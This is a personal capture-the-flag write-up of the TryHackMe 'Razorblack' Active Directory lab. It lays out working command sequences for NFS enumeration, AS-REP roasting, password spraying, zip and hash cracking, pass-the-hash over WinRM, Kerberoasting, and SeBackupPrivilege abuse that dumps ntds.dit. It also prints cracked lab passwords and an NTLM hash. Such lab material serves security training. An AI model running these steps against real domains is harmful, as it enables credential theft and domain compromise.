# Razorblack

Author: THM
Difficulty: 2
Tags: active directory
Type: Windows

# Enumeration

- portscan

```bash
# Nmap 7.92 scan initiated Thu Dec 23 12:21:56 2021 as: nmap -p53,135,111,88,139,389,445,464,593,636,2049,3268,3269,3389,5985,9389,47001,49675,49665,49664,49669,49711,49676,49679,49674,49703,49694,49667 -sV -sC -T4 -Pn -oA 10.10.171.49 10.10.171.49
Nmap scan report for razorblack.thm (10.10.171.49)
Host is up (0.18s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2021-12-23 17:22:53Z)
111/tcp   open  rpcbind       2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/tcp6  rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  2,3,4        111/udp6  rpcbind
|   100003  2,3         2049/udp   nfs
|   100003  2,3         2049/udp6  nfs
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100005  1,2,3       2049/tcp   mountd
|   100005  1,2,3       2049/tcp6  mountd
|   100005  1,2,3       2049/udp   mountd
|   100005  1,2,3       2049/udp6  mountd
|   100021  1,2,3,4     2049/tcp   nlockmgr
|   100021  1,2,3,4     2049/tcp6  nlockmgr
|   100021  1,2,3,4     2049/udp   nlockmgr
|   100021  1,2,3,4     2049/udp6  nlockmgr
|   100024  1           2049/tcp   status
|   100024  1           2049/tcp6  status
|   100024  1           2049/udp   status
|_  100024  1           2049/udp6  status
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: raz0rblack.thm, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
2049/tcp  open  mountd        1-3 (RPC #100005)
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: raz0rblack.thm, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: RAZ0RBLACK
|   NetBIOS_Domain_Name: RAZ0RBLACK
|   NetBIOS_Computer_Name: HAVEN-DC
|   DNS_Domain_Name: raz0rblack.thm
|   DNS_Computer_Name: HAVEN-DC.raz0rblack.thm
|   Product_Version: 10.0.17763
|_  System_Time: 2021-12-23T17:23:48+00:00
| ssl-cert: Subject: commonName=HAVEN-DC.raz0rblack.thm
| Not valid before: 2021-12-22T17:18:42
|_Not valid after:  2022-06-23T17:18:42
|_ssl-date: 2021-12-23T17:23:55+00:00; 0s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49674/tcp open  msrpc         Microsoft Windows RPC
49675/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49676/tcp open  msrpc         Microsoft Windows RPC
49679/tcp open  msrpc         Microsoft Windows RPC
49694/tcp open  msrpc         Microsoft Windows RPC
49703/tcp open  msrpc         Microsoft Windows RPC
49711/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: HAVEN-DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2021-12-23T17:23:47
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Dec 23 12:25:42 2021 -- 1 IP address (1 host up) scanned in 228.04 seconds
```

- NFS service is running, so I tried mounting it

```
2049/tcp  open  mountd        1-3 (RPC #100005)
```

```bash
# to check for mounts 
~/thm/razorblack » showmount -e 10.10.110.203                                                                                                                                                                                  kali@kali
Export list for 10.10.110.203:
/users (everyone)
# mounting /users to our machine
sudo mount 10.10.110.203:/users ./users
```

- Found two files inside that directory → sbradley.txt & employee_status.xlsx
- sbradley seems like a username
- Found a flag inside sbradley.txt
- Found a list of usernames inside employee_status.xlsx

![razorblack-potential-users.png](razorblack-potential-users.png)

- stored these in the desired naming convention

```bash
dport 
sbradley
rzaydan...
```

- Used [GetNPUsers.py](http://GetNPUsers.py) to find a hash for twilliams

```bash
impacket-GetNPusers -no-pass razorblack.thm/ -usersfile users.txt -format hashcat -outputfile hash.txt
```

- cracked the hash to get the password

```bash
twilliams: roastpotatoes
```

- password spraying smb with `roastpotatoes` and users.txt that I had created earlier

```bash
crackmapexec smb 10.10.110.203 -u users.txt -p pass.txt --continue-on-success
```

```bash
SMB         10.10.110.203   445    HAVEN-DC         [-] raz0rblack.thm\rdelgado:roastpotatoes STATUS_LOGON_FAILURE 
SMB         10.10.110.203   445    HAVEN-DC         [+] raz0rblack.thm\twilliams:roastpotatoes 
SMB         10.10.110.203   445    HAVEN-DC         [-] raz0rblack.thm\sbradley:roastpotatoes STATUS_PASSWORD_MUST_CHANGE
```

- looks like we can use the change the password for user ‘sbradley’
- ‘STATUS_PASSWORD_MUST_CHANGE’ → the specified password has expired and new password must be assigned
- change it’s password

```bash
smbpasswd -H 10.10.110.203 -U sbradley
```

- Now we have access to the `trash` share

```bash
.                                   D        0  Tue Mar 16 02:01:28 2021
  ..                                  D        0  Tue Mar 16 02:01:28 2021
  chat_log_20210222143423.txt         A     1340  Thu Feb 25 14:29:05 2021
  experiment_gone_wrong.zip           A 18927164  Tue Mar 16 02:02:20 2021
  sbradley.txt                        A       37  Sat Feb 27 14:24:21 2021
```

```bash
# chat_log... 
sbradley> Hey Administrator our machine has the newly disclosed vulnerability for Windows Server 2019.
Administrator> What vulnerability??
sbradley> That new CVE-2020-1472 which is called ZeroLogon has released a new PoC.
Administrator> I have given you the last warning. If you exploit this on this Domain Controller as you did previously on our old Ubuntu server with dirtycow, I swear I will kill your WinRM-Access.
sbradley> Hey you won't believe what I am seeing.
Administrator> Now, don't say that you ran the exploit.
sbradley> Yeah, The exploit works great it needs nothing like credentials. Just give it IP and domain name and it resets the Administrator pass to an empty hash.
sbradley> I also used some tools to extract ntds. dit and SYSTEM.hive and transferred it into my box. I love running secretsdump.py on those files and dumped the hash.
Administrator> I am feeling like a new cron has been issued in my body named heart attack which will be executed within the next minute.
Administrator> But, Before I die I will kill your WinRM access..........
sbradley> I have made an encrypted zip containing the ntds.dit and the SYSTEM.hive and uploaded the zip inside the trash share.
sbradley> Hey Administrator are you there ...
sbradley> Administrator .....

The administrator died after this incident.

Press F to pay respects
```

- the zip file is password protected
- using zip2john to grab the hash

```bash
zip2john experiment.zip > hash.txt
john --wordlist=rockyou.txt hash.txt
```

```bash
~/thm/razorblack/trash » john --wordlist=/usr/share/wordlists/rockyou.txt zip-hash.txt                                                                                           kali@kali
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
**electromagnetismo** (experiment_gone_wrong.zip)     
1g 0:00:00:02 DONE (2021-12-27 07:46) 0.4444g/s 3724Kp/s 3724Kc/s 3724KC/s eleed2649..elboty2009
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

- extracted ntds.dit and system.hive from the zip file
- using secretsdump along with system.hive and ntds.dit file to dump all hashes

```bash
impacket-secretsdump -system system.hive -ntds ntds.dit LOCAL > secrets.txt
# LOCAL -> because I wanted to parse local files (syste.hive and ntds.dit were on my machine)
```

- using these hashes to bruteforce against the user Ljudmila to get the flag

```bash
# ljudmila's hash
f220d3988deb3f516c73f40ee16c431d
```

```bash
# using evil-winrm to get a shell 
evil-winrm -i $IP -u lvetrova -H <hash>
```

PowerShell has a method for storing encrypted credentials that can only be accessed by the user account that stored them. To retrieve the credential and using it within a script, you read it from the XML file. We will use this method to get the user’s hash

```bash
PS C:\Users\lvetrova> $Credential = Import-Clixml -Path "lvetrova.xml"

PS C:\Users\lvetrova> $Credential.GetNetworkCredential().password
```

- Using pass-the-hash attack to find creds for Xyan1d3

```bash
impacket-GetUserSPNs raz0rblack.thm/lvetrova -hashes f220d3988deb3f516c73f40ee16c431d:f220d3988deb3f516c73f40ee16c431d -outputfile hash.txt
```

- cracking the hash (mode : 13100)
- xyan1d3:cyanide9amine5628
- using evil-winrm to log into his machine
- Found his password using the same method

```bash
*Evil-WinRM* PS C:\Users\xyan1d3> $Credential.GetNetworkCredential().password
LOL here it is -> THM{62ca7e0b901aa8f0b233cade0839b5bb}
```

- xyan has SeBackupPrivilege

> This specific privilege escalation is based on the act of assigning a user **SeBackupPrivilege**. It was designed for allowing users to create backup copies of the
system. This privilege allows the user to read any file on the entirety
of the files that might also include some sensitive files such as the **SAM file or SYSTEM Registry file**
> 
- Creating a diskshadow.txt file with the following contents:

```bash
set metadata C:\tmp\tmp.cabs 
set context persistent nowriters 
add volume c: alias someAlias 
create 
expose %someAlias% h:
```

```bash
*Evil-WinRM* PS C:\Users\xyan1d3> mkdir C:\tmp
*Evil-WinRM* PS C:\tmp> upload diskshadow.txt\
```

Now let's abuse the **SeBackupPrivilege**. For this, we need few `dll` files which we can download from **[here](https://github.com/giuliano108/SeBackupPrivilege)**. After downloading we need to execute it in the following way and then download the hashes.

```powershell
*Evil-WinRM* PS C:\tmp> upload SeBackupPrivilegeUtils.dll

*Evil-WinRM* PS C:\tmp> upload SeBackupPrivilegeCmdLets.dll

*Evil-WinRM* PS C:\tmp> import-module .\SeBackupPrivilegeUtils.dll

*Evil-WinRM* PS C:\tmp> import-module .\SeBackupPrivilegeCmdLets.dll

*Evil-WinRM* PS C:\tmp> copy-filesebackupprivilege h:\windows\ntds\ntds.dit C:\tmp\ntds.dit -overwrite

*Evil-WinRM* PS C:\tmp> reg save HKLM\SYSTEM C:\tmp\system

*Evil-WinRM* PS C:\tmp> download ntds.dit

*Evil-WinRM* PS C:\tmp> download system
```

- now dump the hashes

```powershell
python3 /opt/impacket/examples/secretsdump.py -system system -ntds ntds.dit LOCAL
```

# Notes

-